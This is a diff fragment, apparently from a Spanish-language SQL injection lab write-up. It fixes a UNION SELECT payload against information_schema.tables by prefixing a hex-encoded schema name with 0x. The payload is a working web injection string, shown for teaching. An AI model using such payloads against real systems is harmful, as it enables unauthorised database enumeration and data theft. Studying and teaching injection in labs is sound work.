@@ -164,10 +164,10 @@ Resultado:
 61636164656d795f6c616273
 ```
 
-La query quedaría así
+La query quedaría así (añadimos `0x` para indicar el valor hexadecimal)
 
 ```bash
-' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=61636164656d795f6c616273-- -
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=0x61636164656d795f6c616273-- -
 ```
 
 
